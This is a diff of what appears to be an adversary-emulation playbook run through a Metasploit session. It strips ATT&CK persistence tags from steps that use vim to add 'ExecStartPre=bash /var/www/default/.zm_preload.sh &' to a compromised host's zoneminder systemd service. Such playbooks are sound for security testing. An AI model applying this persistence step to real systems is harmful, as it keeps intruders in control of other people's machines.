@@ -157,34 +157,18 @@ commands:
   - type: msf-session
     cmd: vim /usr/lib/systemd/system/zoneminder.service
     session: "foothold"
-    metadata:
-      techniques: "T1547"
-      tactics: "Persistence, Privilege Escalation"
-      technique_name: "Boot or Logon Autostart Execution"
 
   - type: msf-session
     cmd: ":inoremap jj <ESC>"
     session: "foothold"
-    metadata:
-      techniques: "T1547"
-      tactics: "Persistence, Privilege Escalation"
-      technique_name: "Boot or Logon Autostart Execution"
 
   - type: msf-session
     cmd: "/[Service"
     session: "foothold"
-    metadata:
-      techniques: "T1547"
-      tactics: "Persistence, Privilege Escalation"
-      technique_name: "Boot or Logon Autostart Execution"
 
   - type: msf-session
     cmd: "o"
     session: "foothold"
-    metadata:
-      techniques: "T1547"
-      tactics: "Persistence, Privilege Escalation"
-      technique_name: "Boot or Logon Autostart Execution"
 
   - type: msf-session
     cmd: "ExecStartPre=bash /var/www/default/.zm_preload.sh &"
@@ -197,10 +181,6 @@ commands:
   - type: msf-session
     cmd: "jj"
     session: "foothold"
-    metadata:
-      techniques: "T1547"
-      tactics: "Persistence, Privilege Escalation"
-      technique_name: "Boot or Logon Autostart Execution"
 
   - type: msf-session
     cmd: ":wq!\n"
